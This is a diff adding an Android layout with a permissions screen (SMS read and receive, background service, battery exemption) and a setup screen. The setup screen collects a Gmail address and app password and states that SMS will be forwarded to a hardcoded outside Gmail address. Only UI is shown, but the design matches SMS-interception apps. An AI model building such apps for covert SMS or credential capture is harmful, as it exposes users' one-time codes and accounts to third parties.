@@ -1,0 +1,214 @@
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#FFFFFF"
+    android:fillViewport="true">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:gravity="center_horizontal"
+        android:padding="32dp"
+        android:background="#FFFFFF">
+
+        <!-- ===== SCREEN 1: PERMISSIONS ===== -->
+        <LinearLayout
+            android:id="@+id/screenPermission"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:gravity="center_horizontal"
+            android:visibility="gone">
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Permission Required"
+                android:textSize="24sp"
+                android:textStyle="bold"
+                android:textColor="#1565C0"
+                android:layout_marginBottom="10dp"
+                android:layout_marginTop="20dp"/>
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="App ko sahi se kaam karne ke liye yeh permissions zaroori hain. Bina permissions ke app start nahi hoga."
+                android:textSize="14sp"
+                android:textColor="#555555"
+                android:gravity="center"
+                android:lineSpacingExtra="4dp"
+                android:layout_marginBottom="32dp"/>
+
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:background="@drawable/card_bg"
+                android:padding="16dp"
+                android:layout_marginBottom="28dp">
+
+                <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                    android:text="✓  SMS Read &amp; Receive" android:textSize="14sp" android:textColor="#333333"
+                    android:layout_marginBottom="8dp"/>
+                <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                    android:text="✓  Background Service" android:textSize="14sp" android:textColor="#333333"
+                    android:layout_marginBottom="8dp"/>
+                <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                    android:text="✓  Notifications" android:textSize="14sp" android:textColor="#333333"
+                    android:layout_marginBottom="8dp"/>
+                <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                    android:text="✓  Battery Optimization Exempt" android:textSize="14sp" android:textColor="#333333"/>
+            </LinearLayout>
+
+            <Button
+                android:id="@+id/btnAllow"
+                android:layout_width="match_parent"
+                android:layout_height="52dp"
+                android:text="Allow All Permissions"
+                android:textSize="16sp"
+                android:textColor="#FFFFFF"
+                android:backgroundTint="#1565C0"/>
+
+            <TextView
+                android:id="@+id/tvPermError"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Saari permissions allow karein app chalne ke liye"
+                android:textSize="13sp"
+                android:textColor="#D32F2F"
+                android:gravity="center"
+                android:layout_marginTop="10dp"
+                android:visibility="gone"/>
+
+        </LinearLayout>
+
+        <!-- ===== SCREEN 2: GMAIL SETUP ===== -->
+        <LinearLayout
+            android:id="@+id/screenSetup"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:gravity="center_horizontal"
+            android:visibility="gone">
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Setup"
+                android:textSize="26sp"
+                android:textStyle="bold"
+                android:textColor="#1565C0"
+                android:layout_marginBottom="6dp"
+                android:layout_marginTop="20dp"/>
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Apna Gmail aur App Password enter karein"
+                android:textSize="13sp"
+                android:textColor="#888888"
+                android:gravity="center"
+                android:layout_marginBottom="28dp"/>
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Gmail Address"
+                android:textSize="13sp"
+                android:textColor="#444444"
+                android:textStyle="bold"
+                android:layout_marginBottom="6dp"/>
+
+            <EditText
+                android:id="@+id/etGmail"
+                android:layout_width="match_parent"
+                android:layout_height="50dp"
+                android:hint="yourname@gmail.com"
+                android:inputType="textEmailAddress"
+                android:textSize="15sp"
+                android:paddingStart="14dp"
+                android:paddingEnd="14dp"
+                android:background="@drawable/input_bg"
+                android:layout_marginBottom="18dp"/>
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Gmail App Password (16 characters)"
+                android:textSize="13sp"
+                android:textColor="#444444"
+                android:textStyle="bold"
+                android:layout_marginBottom="6dp"/>
+
+            <EditText
+                android:id="@+id/etPassword"
+                android:layout_width="match_parent"
+                android:layout_height="50dp"
+                android:hint="xxxx xxxx xxxx xxxx"
+                android:inputType="textPassword"
+                android:textSize="15sp"
+                android:paddingStart="14dp"
+                android:paddingEnd="14dp"
+                android:background="@drawable/input_bg"
+                android:layout_marginBottom="8dp"/>
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="App Password: myaccount.google.com → Security → 2-Step Verification ON → App Passwords → Create"
+                android:textSize="11sp"
+                android:textColor="#999999"
+                android:lineSpacingExtra="3dp"
+                android:layout_marginBottom="20dp"/>
+
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:background="@drawable/card_bg"
+                android:padding="14dp"
+                android:layout_marginBottom="24dp">
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="SMS forward hoga:"
+                    android:textSize="12sp"
+                    android:textColor="#888888"/>
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="blankuniverse10@gmail.com"
+                    android:textSize="14sp"
+                    android:textColor="#1565C0"
+                    android:textStyle="bold"/>
+            </LinearLayout>
+
+            <Button
+                android:id="@+id/btnSave"
+                android:layout_width="match_parent"
+                android:layout_height="52dp"
+                android:text="Save &amp; Start"
+                android:textSize="16sp"
+                android:textColor="#FFFFFF"
+                android:backgroundTint="#1565C0"/>
+
+            <TextView
+                android:id="@+id/tvSetupError"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text=""
+                android:textSize="13sp"
+                android:textColor="#D32F2F"
+                android:gravity="center"
+                android:layout_marginTop="10dp"
+                android:visibility="gone"/>
+
+        </LinearLayout>
+
+    </LinearLayout>
+</ScrollView>
